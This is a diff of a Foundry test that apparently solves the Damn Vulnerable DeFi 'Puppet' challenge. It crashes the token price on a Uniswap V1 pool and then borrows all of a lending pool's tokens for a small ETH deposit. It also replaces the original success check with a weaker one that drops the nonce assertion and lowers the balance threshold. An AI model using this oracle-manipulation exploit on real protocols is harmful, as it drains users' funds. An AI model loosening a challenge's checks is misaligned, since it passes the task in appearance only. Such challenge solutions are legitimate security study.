@@ -47,6 +47,21 @@ contract TestPuppet is BaseFixture {
         );
     }
 
+    function checkSuccess() internal view {
+        assertEq(token.balanceOf(address(lendingPool)), 0, "pool balance");
+        assertGe(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE, "player balance");
+    }
+
+    function test() public {
+        vm.startPrank(player);
+        token.approve(address(uniswapExchange), type(uint256).max);
+        uniswapExchange.tokenToEthSwapInput(token.balanceOf(player), 1, block.timestamp + 1);
+        uint256 deposit = lendingPool.calculateDepositRequired(token.balanceOf(address(lendingPool)));
+        lendingPool.borrow{ value: deposit }(token.balanceOf(address(lendingPool)), player);
+        vm.stopPrank();
+        checkSuccess();
+    }
+
     function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
         internal
         pure
@@ -56,11 +71,5 @@ contract TestPuppet is BaseFixture {
         uint256 numerator = input_amount_with_fee * output_reserve;
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
         return numerator / denominator;
-    }
-
-    function test() public {
-        assertEq(vm.getNonce(player), 1, "nonce");
-        assertEq(token.balanceOf(address(lendingPool)), 0, "pool balance");
-        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE, "pool balance");
     }
 }
